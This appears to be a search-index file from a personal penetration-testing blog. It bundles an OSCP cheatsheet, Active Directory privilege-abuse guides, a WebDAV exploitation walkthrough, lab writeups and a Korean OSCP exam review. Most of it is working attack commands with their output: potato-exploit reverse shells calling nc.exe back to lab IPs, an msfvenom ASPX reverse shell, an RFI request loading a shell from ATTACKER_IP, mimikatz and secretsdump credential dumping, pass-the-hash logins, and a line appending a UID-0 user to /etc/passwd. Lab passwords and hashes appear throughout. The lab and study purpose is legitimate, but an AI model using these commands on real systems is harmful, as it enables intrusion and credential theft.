var relearn_searchindex = [
  {
    "breadcrumb": "Home \u003e Posts",
    "content": "Kerberos Kerberoasting (service account) linux impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete windows Rubeus.exe kerberoast /nowrap /outfile:hash /format:hashcat hashcat:\nhashcat -m 13100 hash.txt /path/to/wordlist -r /usr/share/hashcat/rules/best64.rule\nAS-REP Roasting (user account) windows .\\Rubeus.exe asreproast /nowrap /outfile:hash.txt linux impacket-GetNPUsers corp.com/dave -dc-ip 192.168.114.70 hashcat:\nhashcat -m 18200 hash.txt /path/to/wordlist\nWindows privileges SeImpersonatePrivilege potato .\\SigmaPotato.exe --revshell 192.168.45.188 4444 .\\godpotato.exe -cmd \"nc.exe 192.168.45.246 443 -e cmd\" .\\JuicyPotatoNG.exe -t * -p \"c:\\windows\\system32\\cmd.exe\" -a \"/c C:\\users\\chen\\nc.exe 192.168.45.226 443 -e cmd\" SeBackupPrivilege copy SAM and SYSTEM files *Evil-WinRM* PS C:\\users\\anirudh\u003e reg save hklm\\sam ./sam The operation completed successfully. *Evil-WinRM* PS C:\\users\\anirudh\u003e reg save hklm\\system ./system The operation completed successfully. download to kali machine *Evil-WinRM* PS C:\\users\\anirudh\u003e download sam Info: Downloading C:\\users\\anirudh\\sam to sam Info: Download successful! *Evil-WinRM* PS C:\\users\\anirudh\u003e download system Info: Downloading C:\\users\\anirudh\\system to system Info: Download successful! extract credentials impacket-secretsdump -system system -sam sam local SeRestorePrivilege https://oscp.adot8.com/windows-privilege-escalation/whoami-priv/serestoreprivilege\n.\\EnableSeRestorePrivilege.ps1 ren C:\\Windows\\System32\\Utilman.exe C:\\Windows\\System32\\Utilman.pwned ren C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe rdesktop 192.168.134.165 SeManageVolumePrivilege Execute the tool\nGPO ReadGMSAPassword target: svc_apache gmsapasswordreader.exe --accountname svc_apache GenericAll on Computer add a fake computer impacket-addcomputer resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'fake$' -computer-pass 'password!' -dc-ip 192.168.176.175 [*] Successfully added machine account fake$ with password password! Delegate role impacket-rbcd resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -delegate-from 'fake$' -delegate-to 'RESOURCEDC$' -action write -dc-ip 192.168.176.175 [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty [*] Delegation rights modified successfully! [*] fake$ can now impersonate users on RESOURCEDC$ via S4U2Proxy [*] Accounts allowed to act on behalf of other identity: [*] fake$ (S-1-5-21-537427935-490066102-1511301751-4101) WriteOwner make the user (anirudh) owner of the policy. impacket-owneredit -action write -new-owner 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC' 'vault'/'anirudh':'SecureHM' give all privileges to the user impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC' 'vault'/'anirudh':'SecureHM' -dc-ip 192.168.115.172 Add the user to local admin using SharpGPOAbuse.exe .\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName \"Default Domain Policy\" Update the policy gpupdate /force AllExtendedRights import powerview Import-Module .\\PowerView.ps1 reset password Set-DomainUserPassword -Identity 'target_user' -Verbose mimikatz sekurlsa::logonpasswords sekurlsa::wdigest lsadump::sam lsadump::lsa lsadump::cache lsadump::secrets one liner .\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\" .\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"exit\" .\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::secrets\" \"exit\" .\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::lsa\" \"exit\" .\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::cache\" \"exit\" .\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::wdigest\" \"exit\"",
    "description": "Kerberos Kerberoasting (service account) linux impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete windows Rubeus.exe kerberoast /nowrap /outfile:hash /format:hashcat hashcat:\nhashcat -m 13100 hash.txt /path/to/wordlist -r /usr/share/hashcat/rules/best64.rule\nAS-REP Roasting (user account) windows .\\Rubeus.exe asreproast /nowrap /outfile:hash.txt linux impacket-GetNPUsers corp.com/dave -dc-ip 192.168.114.70 hashcat:",
    "tags": [],
    "title": "OSCP_cheatsheet",
    "uri": "/posts/oscp_cheatsheet/index.html"
  },
  {
    "breadcrumb": "Home \u003e Posts \u003e Active Directory",
    "content": "SeRestorePrivilege When an account has SeRestorePrivilege, it can be leveraged to achieve privilege escalation by overwriting protected system files.\nObtain the required script Download the following script, which enables the privilege in the current session:\nscript file.\nEnable the privilege and replace Utilman Execute the script and abuse the privilege to replace Utilman.exe with cmd.exe:\n.\\EnableSeRestorePrivilege.ps1 ren C:\\Windows\\System32\\Utilman.exe C:\\Windows\\System32\\Utilman.pwned ren C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe This works because SeRestorePrivilege allows bypassing file permissions when writing to system locations.\nConnect via RDP From a Linux machine, connect to the target using RDP:\nrdesktop \u003ctarget IP\u003e Trigger SYSTEM shell On the login screen, click the Ease of Access button. Since Utilman.exe has been replaced, this will launch cmd.exe with SYSTEM privileges.",
    "description": "SeRestorePrivilege When an account has SeRestorePrivilege, it can be leveraged to achieve privilege escalation by overwriting protected system files.\nObtain the required script Download the following script, which enables the privilege in the current session:\nscript file.\nEnable the privilege and replace Utilman Execute the script and abuse the privilege to replace Utilman.exe with cmd.exe:\n.\\EnableSeRestorePrivilege.ps1 ren C:\\Windows\\System32\\Utilman.exe C:\\Windows\\System32\\Utilman.pwned ren C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe This works because SeRestorePrivilege allows bypassing file permissions when writing to system locations.",
    "tags": [],
    "title": "Serestoreprivilege",
    "uri": "/posts/ad/serestoreprivilege/index.html"
  },
  {
    "breadcrumb": "Home \u003e Posts \u003e Active Directory",
    "content": "GMSAPassword When a user has adGMSAPassword permission over a target account, it is possible to retrieve the managed password and derive usable credentials for authentication.\nAbuse workflow Identify GMSA permissions If your account has adGMSAPassword rights over a Group Managed Service Account (gMSA), you can extract its password material.\nPrepare the extraction tool Use a tool such as gmsapasswordreader.exe to retrieve the password data.\nTransfer the binary to the target machine (in this case, enox) and execute it:\ngmsapasswordreader.exe --accountname svc_apache Calculating hashes for Old Value [*] Input username : svc_apache$ [*] Input domain : HEIST.OFFSEC [*] Salt : HEIST.OFFSECsvc_apache$ [*] rc4_hmac : B4A3125F0CB30FCBB499D4B4EB1C20D2 [*] aes128_cts_hmac_sha1 : 51943C933F7A24126B1C43883866DDB4 [*] aes256_cts_hmac_sha1 : 003367B7C9B89B1717838E9CE2B79C0CD458326E32870F73EC94AF810F4A7E32 [*] des_cbc_md5 : 45C4D9732C9D1FD5 Calculating hashes for Current Value [*] Input username : svc_apache$ [*] Input domain : HEIST.OFFSEC [*] Salt : HEIST.OFFSECsvc_apache$ [*] rc4_hmac : 037AE0A6176EB04FD4C7AECEB0C4327E [*] aes128_cts_hmac_sha1 : 4CBAA41110A1C11A787B3B007511BE64 [*] aes256_cts_hmac_sha1 : 337BDE8B0B552127E854D423A2B5293DC6091F71C5D76E373341959882AFFFE8 [*] des_cbc_md5 : 7964FE5D51E5869D Authenticate using the retrieved hash With the extracted NTLM (RC4) hash, authenticate as the gMSA account:\nevil-winrm -i 192.168.134.165 -u svc_apache$ -H 037AE0A6176EB04FD4C7AECEB0C4327E",
    "description": "GMSAPassword When a user has adGMSAPassword permission over a target account, it is possible to retrieve the managed password and derive usable credentials for authentication.\nAbuse workflow Identify GMSA permissions If your account has adGMSAPassword rights over a Group Managed Service Account (gMSA), you can extract its password material.",
    "tags": [],
    "title": "AD Gmsapassword",
    "uri": "/posts/ad/gmsapassword/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: GenericAll",
    "uri": "/tags/genericall/index.html"
  },
  {
    "breadcrumb": "Home \u003e Posts \u003e Active Directory",
    "content": "GenericAll permission on a domain computer The user l.livingstone has GenericAll permission on the domain computer RESOURCEDC$.\nGenericAll grants full control over the object — including the ability to write to msDS-AllowedToActOnBehalfOfOtherIdentity. This makes Resource-Based Constrained Delegation (RBCD) abuse possible: we create a machine account we control, configure the target to trust it for delegation, then impersonate any user (including Administrator) to obtain a service ticket via S4U2Proxy.\nStep 1 — Add a fake computer to the domain impacket-addcomputer creates a new machine account in the domain. We authenticate as l.livingstone using her NTLM hash.\nimpacket-addcomputer resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'fake$' -computer-pass 'password!' -dc-ip 192.168.176.175 [*] Successfully added machine account fake$ with password password! Step 2 — Configure RBCD on the target computer Using our GenericAll rights, write fake$ into the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of RESOURCEDC$. This tells the target to trust fake$ for delegation.\nimpacket-rbcd resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -delegate-from 'fake$' -delegate-to 'RESOURCEDC$' -action write -dc-ip 192.168.176.175 [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty [*] Delegation rights modified successfully! [*] fake$ can now impersonate users on RESOURCEDC$ via S4U2Proxy [*] Accounts allowed to act on behalf of other identity: [*] fake$ (S-1-5-21-537427935-490066102-1511301751-4101) Step 3 — Request a service ticket as Administrator Using impacket-getST, perform S4U2Self + S4U2Proxy as fake$ to obtain a CIFS ticket impersonating Administrator.\nimpacket-getST resourced.local/fake$:'password!' -spn cifs/resourcedc.resourced.local -impersonate Administrator -dc-ip 192.168.176.175 [-] CCache file is not found. Skipping... [*] Getting TGT for user [*] Impersonating Administrator [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache Step 4 — Export the ticket Set the KRB5CCNAME environment variable so Impacket tools pick up the saved ticket automatically.\nexport KRB5CCNAME=Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache Step 5 — Connect via psexec Since we authenticate with Kerberos, the target’s hostname must resolve correctly. Add an entry to /etc/hosts if needed, then connect using the ticket.\nimpacket-psexec -k -no-pass resourcedc.resourced.local",
    "description": "GenericAll permission on a domain computer The user l.livingstone has GenericAll permission on the domain computer RESOURCEDC$.\nGenericAll grants full control over the object — including the ability to write to msDS-AllowedToActOnBehalfOfOtherIdentity. This makes Resource-Based Constrained Delegation (RBCD) abuse possible: we create a machine account we control, configure the target to trust it for delegation, then impersonate any user (including Administrator) to obtain a service ticket via S4U2Proxy.",
    "tags": [
      "RBCD",
      "GenericAll"
    ],
    "title": "GenericAll permission on a domain computer",
    "uri": "/posts/ad/rbcd/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: RBCD",
    "uri": "/tags/rbcd/index.html"
  },
  {
    "breadcrumb": "Home",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tags",
    "uri": "/tags/index.html"
  },
  {
    "breadcrumb": "Home \u003e Posts",
    "content": "Active Directory cheatsheet\nAD Gmsapassword GenericAll permission on a domain computer Serestoreprivilege",
    "description": "Active Directory cheatsheet\nAD Gmsapassword GenericAll permission on a domain computer Serestoreprivilege",
    "tags": [],
    "title": "Active Directory",
    "uri": "/posts/ad/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Davtest",
    "uri": "/tags/davtest/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Webdav",
    "uri": "/tags/webdav/index.html"
  },
  {
    "breadcrumb": "Home \u003e Posts",
    "content": "WebDAV Exploitation WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to perform remote file operations on a web server. When misconfigured, it can be a powerful attack surface — especially if it requires only basic credentials or has loose upload restrictions.\nWebDAV typically requires credentials to interact with.\nStep 1 — Enumerate Allowed File Types with davtest davtest tests which file types can be uploaded and executed on the target WebDAV server.\ndavtest -auth fmcsorley:CrabSharkJellyfish192 -sendbd auto -url http://192.168.158.122 Created: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.shtml PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.txt PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.jsp PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.aspx PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.jhtml PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.asp PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.cgi PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.cfm PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.pl PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.html PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.php Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.txt Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.aspx Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.asp Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.html The output shows both .aspx and .asp are executable — meaning we can upload a web shell or reverse shell payload in either format.\nStep 2 — Generate a Reverse Shell Payload Using msfvenom, generate an ASPX reverse shell:\nmsfvenom -p windows/x64/shell_reverse_tcp -f aspx -o rev.aspx LHOST=192.168.45.212 LPORT=443 Step 3 — Upload the Payload Upload the payload using the directory that davtest created in step 1:\ndavtest -auth fmcsorley:CrabSharkJellyfish192 -uploadfile rev.aspx -uploadloc DavTestDir_LOqKQmYZCD2Fd -url http://192.168.158.122 Step 4 — Trigger the Shell With a listener ready, browse to the uploaded file to execute it:\nhttp://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/rev.aspx The reverse shell connects back to the attacker machine.",
    "description": "WebDAV Exploitation WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to perform remote file operations on a web server. When misconfigured, it can be a powerful attack surface — especially if it requires only basic credentials or has loose upload restrictions.\nWebDAV typically requires credentials to interact with.\nStep 1 — Enumerate Allowed File Types with davtest davtest tests which file types can be uploaded and executed on the target WebDAV server.",
    "tags": [
      "Webdav",
      "Davtest"
    ],
    "title": "WebDAV Exploitation with davtest",
    "uri": "/posts/webdav/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: /Etc/Passwd",
    "uri": "/tags//etc/passwd/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Openssl",
    "uri": "/tags/openssl/index.html"
  },
  {
    "breadcrumb": "Home \u003e Writeup \u003e Proving Grounds",
    "content": "port scan PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can't get directory listing: TIMEOUT | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:192.168.45.245 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.2 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA) | 256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA) |_ 256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Simple PHP Photo Gallery 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind |_ 100000 3,4 111/udp6 rpcbind 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA) 445/tcp open netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA) 3306/tcp open mysql MySQL (unauthorized) 33060/tcp open mysqlx MySQL X protocol listener Service Info: Host: SNOOKUMS; OS: Unix initial foothold Upon navigating to the web interface, I identified the version of the underlying framework.\nResearching this specific version revealed that version 0.7 is vulnerable to RFI vulnerability.\nThrough further testing, I confirmed that this vulnerability persists in version 0.8 as well.\nTo gain an initial shell, I prepared a PHP reverse shell script on my local attacker machine. I then leveraged the RFI vulnerability by pointing the img parameter to my hosted shell:\nhttp://\u003cTARGET_IP\u003e/image.php?img=http://\u003cATTACKER_IP\u003e/revshell.php\nExecuting this request triggered the reverse shell, granting me initial access to the victim server as the Apache user.\nPrivilege escalation apache -\u003e michael While enumerating the web root directory, I discovered a database configuration file containing hardcoded credentials:\n\u003c?php define('DBHOST', '127.0.0.1'); define('DBUSER', 'root'); define('DBPASS', 'MalapropDoffUtilize1337'); define('DBNAME', 'SimplePHPGal'); ?\u003e Using these credentials to access the local database, I extracted the users table, which contained several Base64-encoded passwords:\n+----------+----------------------------------------------+ | username | password | +----------+----------------------------------------------+ | josh | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= | | michael | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ== | | serena | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ== | +----------+----------------------------------------------+ After decoding the strings, I successfully retrieved the cleartext password for the user michael:\nHockSydneyCertify123\nmichael -\u003e root After switching to michael via SSH, I ran linpeas.\nThe results highlighted the /etc/passwd file was writable.\nI exploited this by appending a new user with root privileges (UID 0) to the passwd file:\npw=$(openssl passwd Password123); echo \"r00t:${pw}:0:0:root:/root:/bin/bash\" \u003e\u003e /etc/passwd Finally, switch user to r00t with the password.",
    "description": "A comprehensive writeup for the OffSec Snookums machine. Learn how to exploit an RFI vulnerability in SimplePHPGallery for an initial foothold, extract database credentials, and achieve root access by exploiting a writable /etc/passwd file.",
    "tags": [
      "Openssl",
      "/Etc/Passwd",
      "Writable"
    ],
    "title": "Snookums",
    "uri": "/writeup/proving-grounds/snookums/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Writable",
    "uri": "/tags/writable/index.html"
  },
  {
    "breadcrumb": "Home \u003e Private",
    "content": "결과 우선 결과는 60점.\n윈도우 머신 전부 풀었다.\nstand alone은 하나만 proof까지 풀었다.\nAD공략은 생각보다 쉬웠는데 stand alone은 초기 진입 실패하면 그냥 끝이다.\n어느정도 운도 필요한 듯.\nActive Directory WS26 .206 처음 크레덴셜이 ( r.andrews / BusyOfficeWorker890 ) 주어지고 진입해야 하는 머신.\nPORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server | ssl-cert: Subject: commonName=WS26.oscp.exam | Not valid before: 2026-03-05T23:59:45 |_Not valid after: 2026-09-04T23:59:45 |_ssl-date: TLS randomness does not represent time | rdp-ntlm-info: | Target_Name: OSCP | NetBIOS_Domain_Name: OSCP | NetBIOS_Computer_Name: WS26 | DNS_Domain_Name: oscp.exam | DNS_Computer_Name: WS26.oscp.exam | DNS_Tree_Name: oscp.exam | Product_Version: 10.0.22621 |_ System_Time: 2026-03-07T00:17:03+00:00 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found evil-winrm을 사용해서 접속했다.\n처음에 모든 enum을 실시했는데 하나도 공격 벡터로 이어지는게 없었다.\npowerview, winpeas, 스케줄태스크, 서비스들, 내부네트워크 등등\nenum만 3시간 정도 시간 사용.\n결국 bloodhound로 단서를 찾았다.\nr.andrews -\u003e g.jarvis에 AllExtendRights가 있었다.\n아래 순서대로 입력하면 g.jarvis의 비밀번호를 변경할 수 있다.\nPS C:\\users\\r.andrews\\Documents\u003e Import-Module .\\PowerView.ps1 PS C:\\users\\r.andrews\\Documents\u003e $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force PS C:\\users\\r.andrews\\Documents\u003e Set-DomainUserPassword -Identity 'g.jarvis' -Verbose cmdlet Set-DomainUserPassword at command pipeline position 1 Supply values for the following parameters: AccountPassword: ************ VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'g.jarvis' VERBOSE: [Set-DomainUserPassword] Password for user 'g.jarvis' successfully reset 이후 g.jarvis로 이동.\nwinpeas를 실행하고 잘 살펴보면 관리자의 크레덴셜이 적혀있었다.\nadministrator / CarHammerChip964\n알고나면 엄청 간단한데 bloodhound를 너무 늦게 확인하는 바람에 3시간이나 써버렸다.\n너무 복잡하면 공격 벡터가 아닐 확률이 높다.\nAdmin 관리자로 다음 타겟의 크레덴셜을 찾아야한다.\nmimikatz를 실행해서 명령어를 다 넣어봤는데 걸리는 크레덴셜이 하나도 없었다.\n파워쉘 히스토리를 보니까 다음 유저의 크레덴셜이 있었다.\n*Evil-WinRM* PS C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSREadline\u003e type ConsoleHost_history.txt Get-Service | Where-Object {.Status -eq \"Running\"} Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Get-NetAdapter | Where-Object {.Status -eq \"Up\"} Get-ChildItem -Path C:\\ -Recurse | Where-Object {.Length -gt 100MB} Invoke-Command -ComputerName DC20 -ScriptBlock {Get-ADUser -Filter * -Properties LastLogonDate} New-ADUser -Name \"Barrett Martin\" -SamAccountName \"b.martin\" -UserPrincipalName \"b.martin@oscp.exam\" -AccountPassword (ConvertTo-SecureString \"BusyWorkerDay777\" -AsPlainText -Force) -Enabled True Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force -Confirm:False [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'; = 'https://raw.githubusercontent.com/stevencohn/WindowsPowerShell/main' 이건 그래도 빨리 찾아냈는데, 파일안에 숨기는 패턴이 나왔었다고 생각하면 끔찍하다.\nSRV22 .202 b.martin / BusyWorkerDay777로 접속\nPORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: OSCP | NetBIOS_Domain_Name: OSCP | NetBIOS_Computer_Name: SRV22 | DNS_Domain_Name: oscp.exam | DNS_Computer_Name: SRV22.oscp.exam | DNS_Tree_Name: oscp.exam | Product_Version: 10.0.17763 |_ System_Time: 2026-03-07T08:39:50+00:00 | ssl-cert: Subject: commonName=SRV22.oscp.exam | Not valid before: 2026-03-05T23:59:29 |_Not valid after: 2026-09-04T23:59:29 |_ssl-date: 2026-03-07T08:40:30+00:00; +1s from scanner time. 8080/tcp open http Jetty 10.0.20 |_http-server-header: Jetty(10.0.20) | http-robots.txt: 1 disallowed entry |_/ |_http-title: Site doesn't have a title (text/html;charset=utf-8). 3389가 열려있어서 리모트데스크탑으로 연결했다.\nxfreerdp3 /v:172.16.122.202 /u:b.martin /p:BusyWorkerDay777 /size:1200x900\n시작화면에서 터미널이 실행안되지만, 폴더의 어드레스바에 cmd를 입력해서 터미널을 여는데 성공.\n8080포트에 웹서버가 있는데 이건 함정이었다.\n취약점이 없는 jenkins가 있었다.\nProgram Files에 mssql가 있는걸 발견했다.\n터미널에 sqlcmd를 입력하면 mssql 인터액티브 창이 실행된다.\nSELECT name FROM master.dbo.sysdatabases; go use accounts; go SELECT table_name FROM information_schema.tables; go select * from creds; go 여기서 유저들의 정보를 대량 발견.\n스프레이로 유효한 어카운트를 찾았다.\ncrackmapexec smb 172.16.122.202 -u c.rogers -p SnoozeRinseRevolve231 --shares SMB 172.16.122.202 445 SRV22 [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV22) (domain:oscp.exam) (signing:False) (SMBv1:False) SMB 172.16.122.202 445 SRV22 [+] oscp.exam\\c.rogers:SnoozeRinseRevolve231 (Pwn3d!) SMB 172.16.122.202 445 SRV22 [+] Enumerated shares SMB 172.16.122.202 445 SRV22 Share Permissions Remark SMB 172.16.122.202 445 SRV22 ----- ----------- ------ SMB 172.16.122.202 445 SRV22 ADMIN$ READ,WRITE Remote Admin SMB 172.16.122.202 445 SRV22 C$ READ,WRITE Default share SMB 172.16.122.202 445 SRV22 IPC$ READ Remote IPC impacket-psexec으로 관리자 터미널 실행.\nimpacket-psexec oscp.exam/c.rogers:SnoozeRinseRevolve231@172.16.122.202\nDC200 .200 c.rogers의 크레덴셜로 마지막 DC까지 로그인\nwhoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled SeBackupPrivilege가 있다.\nevil-winrm이 있으면 download로 파일을 옮길 수 있어서, 포트포워딩도 필요 없어서 너무 편하다.\n*Evil-WinRM* PS C:\\Users\\c.rogers\u003e reg save hklm\\sam sam The operation completed successfully. *Evil-WinRM* PS C:\\Users\\c.rogers\u003e reg save hklm\\system system The operation completed successfully. impacket-secretsdump -sam sam -system system local Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0xd359caefd2dd5a5551dd5a71481c194e [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:f1932cc134540745795a0c48f58cfc49::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [*] Cleaning up... 관리자의 해시를 획득.\nevil-winrm -i 172.16.122.200 -u administrator -H f1932cc134540745795a0c48f58cfc49\n이걸로 도메인 어드민의 플래그까지 획득.",
    "description": "결과 우선 결과는 60점.\n윈도우 머신 전부 풀었다.\nstand alone은 하나만 proof까지 풀었다.\nAD공략은 생각보다 쉬웠는데 stand alone은 초기 진입 실패하면 그냥 끝이다.\n어느정도 운도 필요한 듯.\nActive Directory WS26 .206 처음 크레덴셜이 ( r.andrews / BusyOfficeWorker890 ) 주어지고 진입해야 하는 머신.",
    "tags": [],
    "title": "OSCP 시험 후기",
    "uri": "/private/oscp/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Phpmyadmin",
    "uri": "/tags/phpmyadmin/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Proxy",
    "uri": "/tags/proxy/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Spose",
    "uri": "/tags/spose/index.html"
  },
  {
    "breadcrumb": "Home \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Squid",
    "uri": "/tags/squid/index.html"
  },
  {
    "breadcrumb": "Home \u003e Writeup \u003e Proving Grounds",
    "content": "initial foothold Nmap scan 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3128/tcp open http-proxy Squid http proxy 4.14 |_http-server-header: squid/4.14 |_http-title: ERROR: The requested URL could not be retrieved 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC The scan results show that a Squid proxy is running on port 3128.\nenumeration When accessing port 3128, only an error page is displayed.\nAt first, I had no idea what to do with this port. While researching, I found an article about enumerating Squid proxies.\nAccording to the article we can use the tool spose.py.\npython3 spose.py --proxy http://192.168.137.189:3128 --target 192.168.137.189 Scanning default common ports Using proxy address http://192.168.137.189:3128 192.168.137.189:3306 seems OPEN 192.168.137.189:8080 seems OPEN This revealed that ports 3306 and 8080 were also accessible. These ports 